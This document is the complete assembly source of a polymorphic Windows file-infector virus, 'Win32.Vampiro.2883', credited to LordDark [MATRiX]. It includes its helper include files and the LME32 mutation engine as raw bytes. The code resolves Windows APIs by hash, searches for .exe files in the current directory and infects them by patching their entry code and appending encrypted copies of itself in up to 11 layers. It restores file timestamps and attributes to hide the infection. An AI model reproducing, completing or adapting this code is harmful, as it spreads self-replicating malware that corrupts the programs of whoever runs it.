; Win32.Vampiro.2883
;
; - poly, used LME32 v.1.0
; - many layers, max - 11
; - used SEH
; - dont change entry point
; 
; (c) LordDark [MATRiX]


.386
include    1.inc 
locals     __
.model flat
.code
db ?
.data

start proc
    call get_delta
    call set_seh
    mov  esp, [esp.8]
    jmp  exit
set_seh:
    sti
    sub  eax, eax
    push 4 ptr fs:[eax]
    mov  4 ptr fs:[eax], esp
    mov  eax, [esp+11*4]
    sub  ax, ax
__5:
    cmp  2 ptr [eax], 'ZM' 
    jz   __4
    sub  eax, 10000h 
    jmp  __5 
__4:
    mov  4 ptr [ebp.k32], eax 
    call import
    push 0
    call [ebp.GetModuleHandleA]
    add  [ebp.host32_1], eax
    call restore
    sub esp, 16
    push esp
    call [ebp.GetSystemTime]
    mov eax, esp
    push eax eax esp eax
    call [ebp.SystemTimeToFileTime]
    mov eax, [esp]
    xor eax, [esp.4] 
    add esp, 24
    mov [ebp.seed], eax
    lea eax, [ebp.rnd]
    mov 4 ptr [ebp.lme32_random], eax
    push _vl 0
    call [ebp.GlobalAlloc]
    push eax
    xchg eax, edi
    lea esi, [ebp.start]
    mov ecx, vl
    lea eax, [ebp+__exit]
    push eax
    lea eax, [edi+__next-start]
    push eax
    rep movsb
    ret
__next:
    call get_delta
    sub  esp, size find_str
    mov  esi, esp
    sub  edi, edi 
    push esi ;;; hehe 
    lea eax, [ebp+mask]
    push eax
    call [ebp+FindFirstFileA]
    cmp eax, -1
    jz  __1
__2:
    push eax
    push edi
    push esi
    lea  edx, [esi.cFileName]
    call infect_it
    pop  esi
    push esi
    push 4 ptr [esp.8]
    call [ebp+FindNextFileA]
    pop  edi
    inc  edi
    cmp  edi, 50
    ja   __3
    test eax, eax
    pop  eax
    jnz __2
    push eax
__3:
    call [ebp+FindClose] 
__1:
    add  esp, size find_str
    ret
__exit:
    call [ebp.GlobalFree] 
exit: 
    pop 4 ptr fs:[0]
    pop eax
    popad
    popf
    db 68h
host32_1 dd offset host32-400000h
    ret  
    endp 

mask db '*.exe',0

restore proc
   push 0 5
   call __1
saved:
   dd 90909090h
   db 90h
__1:   
   mov  eax, [ebp.host32_1]
   push eax
   call [ebp.GetCurrentProcess]  
   push eax 
   call [ebp.WriteProcessMemory] 
   ret
   endp
 
Vampiro db 'Vampiro',0

import_table:
import_beg kernel32
import_nam _lopen
import_nam ReadFile
import_nam WriteFile
import_nam CloseHandle
import_nam SetFileAttributesA
import_nam GetFileAttributesA
import_nam GetFileTime
import_nam SetFileTime
import_nam SetEndOfFile
import_nam GetFileSize
import_nam SetFilePointer
import_nam SystemTimeToFileTime
import_nam GetSystemTime
import_nam WriteProcessMemory
import_nam GetCurrentProcess
import_nam GlobalAlloc
import_nam GlobalFree
import_nam FindClose
import_nam FindFirstFileA
import_nam FindNextFileA
import_end
import_end

get_delta proc
     call $+5
delta:
     cld 
     pop ebp
     sub ebp, offset delta
     ret
     endp

include import.inc

infect_it proc
     call __set_seh
     mov  esp, [esp.8]
     jmp  __1
__set_seh:
     cld 
     sub eax, eax
     push 4 ptr fs:[eax]
     mov  4 ptr fs:[eax], esp
     call infect
__1:
     pop 4 ptr fs:[0]
     pop eax 
     ret
     endp

infect proc
       ; edx - name
       call fattrg
       cmp  eax, -1
       jnz __1
__2:
       ret
__1:   sub  ecx, ecx
       xchg eax, ecx
       call fattrs
       test eax, eax
       jz  __2
       push 2
       pop eax
       call open
       cmp eax, -1
       xchg eax, ebx
       jz __2
       push ecx 
       sub  esp, 3*8
       mov  esi, esp
       push edx
       call gettime
       lea  edx, [ebp.buffer]
       push 3Ch+4
       pop  ecx
       call read
       jc   __close
       cmp  2 ptr [edx], 'ZM'
       jnz __close
       cmp  2 ptr [edx.18h], 40h
       jb  __close
       push edx
       movzx edx, 2 ptr [edx.3Ch]
       mov  [ebp.word3C], edx
       call seek
       pop edx
       mov ecx, 0F8h + (28h*8)   
       call read
       jc __close
       cmp 2 ptr [edx], 'EP'
       jnz __close
       ; dll ? if i process dll then skip
       ; this test
       test 2 ptr [edx.16h], 2000h
       jnz __close
       ; can run ?
       test 2 ptr [edx.16h], 0002h
       jz  __close
       ; intel x86 processor ?
       mov al, [edx.4]
       and al, 11110000b
       cmp al, 40h
       jnz __close
       ; 2..8 sections ?
       cmp  2 ptr [edx.06h], 8
       ja  __close
       cmp  2 ptr [edx.06h], 2
       jb  __close
       ; it's already ?
       mov  al, 2Eh
       cmp  1 ptr [edx.44h], al
       jz  __close
       mov  1 ptr [edx.44h], al
       ; save EIP
       mov  eax, [edx.28h]
       mov  [ebp.host32_1], eax
       mov  eax, 1000h
       cmp  [edx.38h], eax
       ja   __close
       cmp  [edx.3Ch], eax
       ja   __close  
       lea  edi, [ebp.buff]
       mov  ecx, (len_buff)/4
       sub  eax, eax
       call rnd
__loop:
       sub al, cl
       rol eax, 1  
       stosd
       loop __loop         
       ; ecx - null
       mov  4 ptr [edx.58h], ecx
       call process_it
__close:
       pop  edx
       mov  esi, esp
       call settime
       add  esp, 3*8
       call close
       pop  eax 
       call fattrs 
       ret
       endp

process_it proc
       movzx eax, 2 ptr [edx.14h]
       cmp  al, 0E0h
       jnz  __1
       lea  edi, [eax+18h+edx] 
       movzx ecx, 2 ptr [edx.6]
__loop:
       ; check file
       mov  esi, [edx.28h]
       cmp  4 ptr [edi.0Ch], esi
       ja   __4
       push eax
       mov  eax, 4 ptr [edi.0Ch]
       add  eax, 4 ptr [edi.10h]
       cmp  esi, eax
       pop  eax
       jb   __5
__4:  
       add  edi, 28h 
       loop __loop
       jmp  __1
__5:   test 1 ptr [edi.27h], 80h
       jnz  __1  
       ; read from IP some bytes
       ; for UEP
       lea  esi, [eax+18h+edx] 
       push edx
       mov eax, [edx.028h]
       sub eax, [edi.0Ch]
       add eax, [edi.14h]
       mov  4 ptr [ebp.forUEP], eax
       xchg eax, edx
       call seek
       lea  edx, [ebp.UEP]
       mov  ecx, size_UEP
       call read
       pop edx
       jc   __1
       movzx eax, 2 ptr [edx.6]
       dec eax
       imul eax, eax, 28h
       add esi, eax
       mov edi, [esi.14h]
       add edi, [esi.10h]
       call fsize
       cmp eax, edi
       jz  __2
       push edx
       mov  edx, edi
       call seek
       push eax
       mov  edx, esp
       push 4
       pop  ecx
       call read 
       pop  eax
       cmp  eax, 1
       jz   __3
       call fsize
       sub eax, edi
       cmp eax, 100h ; 256 bytes only
                     ; if yes then skip it ;)
       jb   __3
       pop eax
       jmp __1
__3:
       mov  edx, edi
       call seek 
       call truncate 
       pop  edx
__2:   mov  [ebp.flen], edi
       or   1 ptr [esi.24h+3], 0C0h        

       lea edi, [ebp.UEP]
       mov eax, [edi]
       mov 4 ptr [ebp.saved], eax
       mov al, [edi.4]
       mov 1 ptr [ebp.saved+4], al
       mov al, 0E9h
       stosb
       mov  eax, 4 ptr [esi.10h]
       add  eax, 4 ptr [esi.0Ch]
       sub  eax, 4 ptr [ebp.host32_1]
       sub  eax, 5
       stosd
       ; max 11 layers!
       push esi
       ; gen 1 layer
       lea  esi, [ebp.start]
       lea  edi, [ebp.buff]
       mov  ecx, vl
       call lme32
       ; max 10 layer
       ; 2..10
       push eax
       push 5
       pop eax
       call rnd
       inc eax
       shl eax, 1
       xchg eax, ecx
       ; gen next layers  
       pop eax
__8:
       push ecx
       ; 1 layer  <-|
       ; 2 layer ---|
       mov  esi, edi
       add  edi, eax
       xchg eax, ecx
       call lme32
       xchg esi, edi
       xchg eax, ecx
       call lme32
       ; edi - 1 layer
       ; esi - 2 layer
       ; eax - length
       pop ecx
       loop __8
       pop esi
       dec edi
       dec edi
       mov 2 ptr [edi], 609Ch
       add eax, 8 
       xchg eax, edi
       push eax 
       ; edi - virus length
       mov eax, edi
       add eax, [edx.3Ch]
       add eax, [esi.10h]
       mov ecx, [edx.3Ch]
       neg ecx
       and eax, ecx
       mov [esi.10h], eax
       cmp [esi.08h], eax
       ja  __x
       mov [esi.08h], eax
__x:   mov eax, [esi.08h]
       add eax, [esi.0Ch]
       add eax, [edx.38h]
       mov ecx, [edx.38h]
       neg ecx
       and eax, ecx 
       mov [edx.50h], eax  
       call fsize
       xchg eax, edx
       call seek       
       pop edx 
       push -1
       pop eax
       call rnd
       db  0BFh
flen   dd  0
       mov ecx, [esi.10h]
       add ecx, [esi.14h]
       sub ecx, edi
       mov 1 ptr [ecx+edx-6], al
       xor al, 'V'
       mov 1 ptr [ecx+edx-6+1], al
       mov 4 ptr [ecx+edx-6+2], edi 
       call write
       mov edx, [ebp.forUEP]
       call seek
       lea edx, [ebp.UEP]
       mov ecx, size_UEP
       call write
       mov edx, [ebp.word3C]
       call seek
       lea edx, [ebp.buffer]
       mov ecx, 0F8h + (28h*8)   
       call write 
__1:       
       ret
       endp

rnd proc 
    push ebp
    push edx ecx eax
    call $+5
$delta:
    pop ebp
    sub ebp, offset $delta
    db 0B8h
seed   dd ?
    imul eax, eax, 8088405h
    inc eax
    mov [ebp.seed], eax
    pop ecx
    jecxz __1
    xor edx, edx
    div ecx
    xchg eax, edx 
__1:
    pop ecx edx
    pop ebp
    ret 
    endp

include fio.inc
include lme32.inc

vl equ ($-start)

buff:   
       db (11*2000)+vl*2 dup (?)
       db 1000h          dup (?)   
len_buff equ $-buff
buffer db 0F8h + (28h*8) dup (?)
word3C dd ?
size_UEP equ 5
UEP    db size_UEP dup (?)
forUEP dd ?

_vl equ ($-start)

.code
host32:
    db 0E9h
    dd 0 
    push 0
    zcall ExitProcess 
    db 'Win32.Vampiro.'  
    db vl / 1000 mod 10 + '0'
    db vl / 100  mod 10 + '0'
    db vl / 10   mod 10 + '0'
    db vl / 1    mod 10 + '0'
real_start:
    pushf
    pusha
    jmp start
end real_start

--[1.inc]--------------------------------------------------------------------->8

zcall   macro api
        extrn api: proc
        call  api
        endm

CRC32_init	equ 0EDB88320h
CRC32_num       equ 0FFFFFFFFh   

CRC32_eax macro string
          db 0B8h
          CRC32 string  
          endm 

CRC32	macro	string
	    crcReg = CRC32_num
	    irpc    _x,<string>
		ctrlByte = '&_x&' xor (crcReg and 0FFh)
		crcReg = crcReg shr 8
		rept 8
		    ctrlByte = (ctrlByte shr 1) xor (CRC32_init * (ctrlByte and 1))
		endm
		crcReg = crcReg xor ctrlByte
	    endm
	    dd	crcReg
endm

import_beg macro kernel
           db '&kernel&',0
           endm
import_nam macro name
           CRC32 &name&
           local b
           b=0
           irpc a,<name>
               IF b EQ 0 
                  db '&a&'
               ENDIF
               b=b+1
           endm
&name&     dd    0       
           endm 
import_end macro 
           dd 0
           endm

MAX_PATH = 260

find_str struc
         dwFileAttributes  dd ?
         ftCreationTime    dq ?
         ftLastAccessTime  dq ?
         ftLastWriteTime   dq ? 
         nFileSizeHigh     dd ? 
         nFileSizeLow      dd ?
         dwReserved0       dd ?
         dwReserved1       dd ?   
         cFileName         db MAX_PATH dup (?)
         cAlternateFileName db 14 dup (?)
         ends

unicode macro text
        irpc _x,<text>
             db '&_x&',0   
        endm
        db 0,0   
        endm

hook macro name
           local b
           b=0
           irpc a,<name>
               IF b EQ 0 
                  db '&a&'
               ENDIF
               b=b+1
           endm
           CRC32 &name&
           dw offset h&name&-start
           dw offset _&name&-start
     endm

dtime struc
      wYear          dw ?
      wMonth         dw ? 
      wDayOfWeek     dw ?
      wDay           dw ?  
      wHour          dw ?  
      wMinute        dw ? 
      wSecond        dw ? 
      wMilliseconds  dw ? 
      ends

--[import.inc]---------------------------------------------------------------->8

get_proc proc
    push ebp
    ; in: 
    ; eax - CRC32
    ; ebx - DLL offset
    ; dl  - first char
    ; out:
    ; eax       - API address
    ; [ecx+ebx] - offset API address in table
    ; ebx       - offset DLL
    mov edi, [ebx+3Ch]
    mov edi, [edi+78h+ebx]
    mov ecx, [edi+18h+ebx]
    mov esi, [edi+20h+ebx]
__1:
    mov ebp, [esi+ebx]
    add ebp, ebx
    cmp 1 ptr [ebp], dl
    jnz __2
    push ebx ecx
    ; use ebx, ecx
    ; ebp - offset to name'z
    xor ebx, ebx
    dec ebx
__5:
    xor bl, 1 ptr [ebp]  
    inc ebp
    mov cl, 7
__3:
    shr ebx, 1
    jnc __4
    xor ebx, CRC32_init
__4: 
    dec cl
    jns __3
    cmp  1 ptr [ebp], 0
    jnz __5
    cmp eax, ebx
    pop ecx ebx
    jz __6
__2:
    add esi, 4   
    loop __1  
__6:
    sub ecx, [edi+18h+ebx]
    neg ecx
    add ecx, ecx
    add ecx, [edi+24h+ebx]
    add ecx, ebx
    movzx ecx, 2 ptr [ecx]
    shl ecx, 2
    add ecx, [edi+1Ch+ebx]
    mov eax, [ecx+ebx]
    add eax, ebx
    pop ebp 
    ret
    endp

import proc
    mov ebx, [ebp.k32]
    CRC32_eax GetModuleHandleA
    mov dl, 'G'
    call get_proc
    mov [ebp.GetModuleHandleA], eax
    CRC32_eax LoadLibraryA
    mov dl, 'L'
    call get_proc
    mov [ebp.LoadLibraryA], eax
    lea esi, [ebp.import_table]  
__1:
    push esi
    call [ebp.GetModuleHandleA]
    test eax, eax
    jnz  __2
    ; if library not load ...
    push esi
    call [ebp.LoadLibraryA]
__2: 
    xchg eax, ebx
__3:
    lodsb
    test al, al
    jnz __3 
__4:
    lodsd
    test eax, eax
    jz   __5
    mov dl, [esi]
    inc esi
    push esi
    call get_proc
    pop edi
    stosd
    mov esi, edi
    jmp __4
__5: 
    cmp [esi], eax
    jnz __1  
    ret  
    endp

GetModuleHandleA   dd 0
LoadLibraryA       dd 0   
k32                dd 0BFF70000h

--[fio.inc]------------------------------------------------------------------->8

truncate proc
      pushad
      push ebx
      call [ebp.SetEndOfFile]
      jmp n_chk
      endp


fsize proc
      pushad
      push 0 ebx
      call [ebp.GetFileSize] 
      jmp n_chk       
      endp


gettime proc
      pushad
      ; esi - addres struc
      ;
      ;  CONST FILETIME *  lpftLastWrite 	// time the file was last written 
      ;  CONST FILETIME *  lpftLastAccess,	// time the file was last accessed 
      ;  CONST FILETIME *  lpftCreation,	// time the file was created 
      ;
      ; filetime struc
      ;      dwLowDateTime   dd ?
      ;      dwHighDateTime  dd ? 
      ;      ends
      push esi
      lodsd
      lodsd
      push esi
      lodsd
      lodsd
      push esi ebx
      call [ebp.GetFileTime]
      jmp n_chk       
      endp


settime proc
      pushad
      ; esi - addres struc
      ;
      ;  CONST FILETIME *  lpftLastWrite 	// time the file was last written 
      ;  CONST FILETIME *  lpftLastAccess,	// time the file was last accessed 
      ;  CONST FILETIME *  lpftCreation,	// time the file was created 
      ;
      ; filetime struc
      ;      dwLowDateTime   dd ?
      ;      dwHighDateTime  dd ? 
      ;      ends
      push esi
      lodsd
      lodsd
      push esi
      lodsd
      lodsd
      push esi ebx
      call [ebp.SetFileTime]
      jmp n_chk       
      endp

fattrs proc
      pushad
      push eax edx
      call [ebp.SetFileAttributesA]
      jmp n_chk
      endp

fattrg proc
      pushad
      push edx
      call [ebp.GetFileAttributesA]
      jmp n_chk
      endp

open proc
     pushad
     ; eax - mode
     ; edx - name
     ;
     ; OF_READ		Opens the file for reading only.
     ; OF_READWRITE	Opens the file for reading and writing.
     ; OF_WRITE		Opens the file for writing only.
     push eax edx
     call [ebp._lopen] 
n_chk:
     mov [esp.1Ch], eax
     popad
     ret
     endp

close proc
     pushad
     push ebx
     call [ebp.CloseHandle]
     popad
     ret 
     endp

write proc
     pushad
     push eax
     mov  eax, esp
     push 0
     push eax 
     push ecx edx ebx  
     call [ebp.WriteFile]
     jmp n_check
     endp

read proc
     ; ecx - length
     ; ebx - handle
     ; edx - buffer
     pushad
     push eax
     mov  eax, esp 
     push 0
     push eax
     push ecx edx ebx  
     call [ebp.ReadFile]
n_check:
     pop eax
     mov [esp.1Ch], eax
     popad
     cmp eax, ecx
     jz  __1
     stc
__1:
     ret  
     endp

seek proc
     pushad
     push 0 0 edx ebx
     call [ebp.SetFilePointer]
     jmp n_chk 
     endp

--[lme32.inc]----------------------------------------------------------------->8

; LME32 v.1.0
;
; ECX - length
; EDI - buffer
; ESI - source
;
; must be in r/w section

lme32:
db  060h,0E8h,00Fh,000h,000h,000h
lme32_random dd 0
db  05Bh,04Ch,04Dh,045h
db  033h,032h,02Eh,031h,031h,037h,033h,05Dh,081h,0EDh,006h,020h,040h,000h
db  0C1h,0E9h,002h,041h,089h,08Dh,0D3h,021h,040h,000h,089h,0BDh,0E5h,021h
db  040h,000h,089h,0B5h,0CEh,021h,040h,000h,0C7h,085h,025h,022h,040h,000h
db  0EFh,000h,000h,000h,08Dh,0B5h,030h,022h,040h,000h,0E8h,00Fh,003h,000h
db  000h,0B0h,003h,0FFh,0D6h,040h,091h,051h,0E8h,070h,002h,000h,000h,059h
db  0E2h,0F7h,0B0h,0E8h,0AAh,02Bh,0C0h,0ABh,08Bh,0C7h,02Bh,085h,0E5h,021h
db  040h,000h,089h,085h,0BCh,021h,040h,000h,0E8h,0E7h,002h,000h,000h,0E8h
db  0ABh,001h,000h,000h,088h,085h,046h,021h,040h,000h,050h,00Fh,0B6h,0C0h
db  00Fh,0B3h,085h,025h,022h,040h,000h,058h,00Ch,058h,0AAh,0E8h,091h,001h
db  000h,000h,050h,00Fh,0B6h,0C0h,00Fh,0B3h,085h,025h,022h,040h,000h,058h
db  088h,085h,077h,021h,040h,000h,08Bh,095h,0D3h,021h,040h,000h,0E8h,053h
db  001h,000h,000h,0E8h,0A6h,002h,000h,000h,0E8h,0B1h,002h,000h,000h,06Ah
db  0FFh,058h,0FFh,095h,006h,020h,040h,000h,089h,085h,0E1h,020h,040h,000h
db  0B0h,081h,0AAh,0E8h,04Ah,001h,000h,000h,0B0h,0E8h,074h,002h,0B0h,0C0h
db  09Ch,00Ah,085h,046h,021h,040h,000h,0AAh,089h,0BDh,082h,021h,040h,000h
db  0B8h,064h,022h,002h,002h,0ABh,09Dh,074h,006h,0F7h,09Dh,0E1h,020h,040h
db  000h,0E8h,062h,002h,000h,000h,0B0h,003h,0FFh,0D6h,003h,0C0h,08Bh,09Ch
db  005h,0F5h,021h,040h,000h,066h,089h,09Dh,0DDh,021h,040h,000h,08Bh,084h
db  005h,0EFh,021h,040h,000h,00Ah,0A5h,046h,021h,040h,000h,066h,0ABh,089h
db  0BDh,0C7h,021h,040h,000h,0ABh,06Ah,0FFh,058h,0FFh,095h,006h,020h,040h
db  000h,089h,085h,0D8h,021h,040h,000h,0ABh,0E8h,023h,002h,000h,000h,0B0h
db  083h,0AAh,0E8h,0DBh,000h,000h,000h,066h,0B8h,0C0h,004h,074h,004h,066h
db  0B8h,0E8h,0FCh,00Ch,003h,066h,0ABh,0E8h,008h,002h,000h,000h,0B0h,048h
db  00Ah,085h,077h,021h,040h,000h,0AAh,0E8h,0FAh,001h,000h,000h,0E8h,005h
db  002h,000h,000h,0B0h,003h,0FFh,0D6h,08Dh,09Dh,0FBh,021h,040h,000h,0D7h
db  0AAh,08Ah,085h,077h,021h,040h,000h,0C0h,0E0h,003h,00Ch,000h,00Ch,0C0h
db  0AAh,066h,0B8h,00Fh,085h,066h,0ABh,0B8h,0E0h,098h,040h,000h,02Bh,0C7h
db  0ABh,050h,00Fh,0B6h,085h,046h,021h,040h,000h,00Fh,0ABh,085h,025h,022h
db  040h,000h,058h,050h,00Fh,0B6h,085h,077h,021h,040h,000h,00Fh,0ABh,085h
db  025h,022h,040h,000h,058h,0E8h,0A8h,001h,000h,000h,0E8h,0B3h,001h,000h
db  000h,08Bh,0C7h,02Bh,085h,0E5h,021h,040h,000h,02Dh,030h,002h,000h,000h
db  003h,085h,0E1h,020h,040h,000h,0BAh,0F8h,098h,040h,000h,089h,002h,0BEh
db  02Bh,082h,040h,000h,0B9h,015h,005h,000h,000h,0BAh,084h,056h,0BAh,05Ah
db  0ADh,003h,0C2h,0ABh,0E2h,0FAh,08Bh,0C7h,02Dh,07Dh,096h,040h,000h,089h
db  044h,024h,01Ch,061h,0C3h,081h,0B0h,081h,080h,081h,0A8h,033h,0C2h,02Bh
db  0C2h,003h,0C2h,085h,023h,00Bh,0E8h,013h,000h,000h,000h,074h,006h,00Ch
db  0B8h,0AAh,092h,0ABh,0C3h,050h,0B0h,068h,0AAh,092h,0ABh,058h,00Ch,058h
db  0AAh,0C3h,050h,0B0h,002h,0FFh,0D6h,085h,0C0h,058h,0C3h,053h,0B0h,008h
db  0FFh,0D6h,0BBh,0EFh,000h,000h,000h,00Fh,0A3h,0C3h,073h,0F2h,05Bh,0C3h
db  00Fh,0B6h,0C0h,0FFh,0A5h,006h,020h,040h,000h,080h,0CCh,0C0h,0C0h,0E0h
db  003h,00Ah,0C4h,0AAh,0C3h,008h,047h,0FFh,0C3h,00Ch,0C0h,0AAh,0B0h,008h
db  0FFh,0D6h,03Ch,006h,074h,0F8h,0C0h,0E0h,003h,008h,047h,0FFh,0C3h,00Ch
db  0C0h,0C0h,0E4h,003h,00Ah,0C4h,0AAh,0B0h,0FFh,0FFh,0D6h,0AAh,0C3h,08Bh
db  039h,002h,07Fh,0B7h,039h,002h,040h,0BFh,039h,002h,040h,087h,039h,002h
db  0BFh,003h,039h,002h,07Fh,013h,039h,002h,07Fh,023h,039h,002h,07Fh,00Bh
db  039h,002h,07Fh,02Bh,039h,002h,07Fh,01Bh,039h,002h,07Fh,033h,039h,002h
db  07Fh,040h,043h,002h,07Fh,048h,043h,002h,07Fh,039h,039h,002h,03Fh,085h
db  039h,002h,03Fh,0D1h,047h,002h,07Fh,0D3h,047h,002h,07Fh,0A4h,059h,002h
db  040h,0ACh,059h,002h,040h,0C8h,043h,002h,040h,0ABh,039h,002h,080h,0B3h
db  039h,002h,080h,0BBh,039h,002h,080h,0E8h,09Eh,000h,000h,000h,0B8h,064h
db  067h,0FFh,036h,0ABh,02Bh,0C0h,066h,0ABh,0E8h,07Fh,000h,000h,000h,0E8h
db  08Ah,000h,000h,000h,0B0h,0E8h,0AAh,0ABh,057h,0E8h,070h,000h,000h,000h
db  0E8h,07Bh,000h,000h,000h,0B8h,064h,067h,08Fh,006h,0ABh,02Bh,0C0h,066h
db  0ABh,0E8h,05Ch,000h,000h,000h,0E8h,067h,000h,000h,000h,0B0h,0E9h,0AAh
db  0ABh,08Bh,0D7h,0E8h,04Ch,000h,000h,000h,0E8h,057h,000h,000h,000h,058h
db  08Bh,0DFh,02Bh,0D8h,089h,058h,0FCh,0E8h,03Ah,000h,000h,000h,0E8h,045h
db  000h,000h,000h,0B8h,064h,067h,08Fh,006h,0ABh,02Bh,0C0h,066h,0ABh,0E8h
db  026h,000h,000h,000h,0E8h,031h,000h,000h,000h,0B8h,064h,067h,0FFh,026h
db  0ABh,02Bh,0C0h,066h,0ABh,0E8h,012h,000h,000h,000h,0B0h,0FFh,0FFh,0D6h
db  0AAh,0E8h,008h,000h,000h,000h,08Bh,0C7h,02Bh,0C2h,089h,042h,0FCh,0C3h
db  0B0h,005h,0FFh,0D6h,040h,091h,051h,0E8h,013h,000h,000h,000h,059h,0E2h
db  0F7h,0C3h,080h,0BDh,07Eh,023h,040h,000h,001h,075h,005h,0E8h,009h,000h
db  000h,000h,0C3h,0B0h,004h,0FFh,0D6h,022h,0C0h,075h,049h,0B0h,000h,084h
db  0C0h,075h,012h,0FEh,085h,07Eh,023h,040h,000h,0B0h,0E8h,0AAh,089h,0BDh
db  09Eh,023h,040h,000h,0ABh,0EBh,031h,0E8h,085h,0FEh,0FFh,0FFh,00Ch,0B8h
db  0AAh,0B8h,034h,099h,040h,000h,08Bh,0DFh,02Bh,0D8h,057h,097h,093h,083h
db  0E8h,004h,0ABh,05Fh,0B0h,0C3h,0AAh,06Ah,0FFh,058h,0FFh,095h,006h,020h
db  040h,000h,066h,0ABh,0C1h,0E8h,010h,0AAh,0FEh,08Dh,07Eh,023h,040h,000h
db  0B0h,01Ah,0FFh,0D6h,03Ch,019h,075h,016h,0E8h,009h,000h,000h,000h,0F8h
db  0FCh,0FAh,0F5h,0FBh,090h,0F9h,0FDh,09Eh,05Bh,0B0h,009h,0FFh,0D6h,0D7h
db  0AAh,0C3h,03Ch,018h,075h,017h,052h,06Ah,0FFh,058h,0FFh,095h,006h,020h
db  040h,000h,092h,0E8h,027h,0FEh,0FFh,0FFh,0E8h,001h,0FEh,0FFh,0FFh,05Ah
db  0C3h,03Ch,017h,075h,01Dh,0B0h,08Dh,0AAh,0E8h,014h,0FEh,0FFh,0FFh,03Ch
db  005h,074h,0F7h,0C0h,0E0h,003h,00Ch,005h,0AAh,06Ah,0FFh,058h,0FFh,095h
db  006h,020h,040h,000h,0ABh,0C3h,08Dh,09Ch,085h,067h,022h,040h,000h,0E8h
db  0EAh,0FDh,0FFh,0FFh,074h,003h,0B0h,066h,0AAh,0F6h,043h,003h,03Fh,075h
db  003h,0B0h,00Fh,0AAh,08Ah,003h,0AAh,08Ah,043h,003h,024h,0C0h,03Ch,000h
db  075h,016h,0B0h,008h,0FFh,095h,006h,020h,040h,000h,08Ah,0C8h,0B0h,008h
db  0FFh,095h,006h,020h,040h,000h,08Ah,0E1h,0EBh,02Bh,03Ch,040h,075h,015h
db  0E8h,0BAh,0FDh,0FFh,0FFh,08Ah,0C8h,0B0h,008h,0FFh,095h,006h,020h,040h
db  000h,08Ah,0E0h,08Ah,0C1h,0EBh,012h,0E8h,0A5h,0FDh,0FFh,0FFh,08Ah,0C8h
db  0E8h,09Eh,0FDh,0FFh,0FFh,03Ah,0C1h,074h,0F0h,08Ah,0E1h,00Fh,0B7h,05Bh
db  001h,08Dh,09Ch,01Dh,000h,020h,040h,000h,0FFh,0D3h,0C3h
